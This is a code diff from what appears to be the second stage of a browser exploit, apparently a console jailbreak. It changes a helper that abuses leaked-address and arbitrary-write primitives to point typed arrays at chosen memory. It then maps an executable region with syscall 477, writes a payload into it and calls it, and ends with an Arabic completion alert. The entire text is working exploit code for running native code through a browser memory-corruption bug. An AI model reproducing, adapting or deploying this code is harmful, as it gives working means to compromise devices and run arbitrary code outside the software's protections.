@@ -109,6 +109,31 @@ function stage2() {
     return ptr;
   }
 
+  function array_from_address_m(addr, size, type) {
+    if(type != 1 && type != 2 && type != 4) {
+        return undefined;
+    }
+    var og_array;
+    if(type == 1) {
+        og_array = new Uint8Array(0x4000);
+    }
+    if(type == 2) {
+        og_array = new Uint16Array(0x2000);
+    }
+    if(type == 4) {
+        og_array = new Uint32Array(0x1000);
+    }
+    var og_array_i = p.leakval(og_array).add32(0x10);
+    p.write8(og_array_i, addr);
+    p.write4(og_array_i.add32(8), size);
+    nogc.push(og_array);
+    return og_array;
+  }
+  
+  function array_from_address(addr, size, type) {
+    return array_from_address_m(addr,size,4);
+  }
+/*
   function array_from_address(addr, size) {
     var og_array = new Uint32Array(0x1000);
     var og_array_i = p.leakval(og_array).add32(0x10);
@@ -119,7 +144,7 @@ function stage2() {
     nogc.push(og_array);
     return og_array;
   }
-
+*/
   function stringify(str) {
     var bufView = new Uint8Array(str.length + 1);
     for (var i = 0; i < str.length; i++) {
@@ -215,10 +240,10 @@ function stage2() {
     }
   } 
     
-	  var payload_buffer = chain.syscall(477, new int64(0x26200000, 0x9), 0x300000, 7, 0x41000, -1, 0);
-	  var payload_writer = p.array_from_address(payload_buffer, 0xC0000);
-	  write_payload(payload_writer);
-	  chain.call(payload_buffer);
+  var payload_buffer = chain.syscall(477, new int64(0x26200000, 0x9), 0x300000, 7, 0x41000, -1, 0);
+  var payload_writer = array_from_address_m(payload_buffer, 0xC0000*4, 1);
+  write_payload(payload_writer);
+  chain.call(payload_buffer);
 	  	alert("\u0643\u062F\u0647 \u0643\u0644\u0647 \u062A\u0645\u0627\u0645!\n \u0627\u0636\u0641\u0637 \u0627\u0648\u0643 \u0644\u0644\u0631\u062C\u0648\u0639 \u0644\u0644\u0635\u0641\u062D\u0629 \u0627\u0644\u0631\u0626\u064A\u0633\u064A\u0629 \n \u0645\u0639 \u062A\u062D\u064A\u0627\u062A \u062F. \u0643\u064A\u0628\u0644 ");
 		document.location.href = 'index.html';
 }
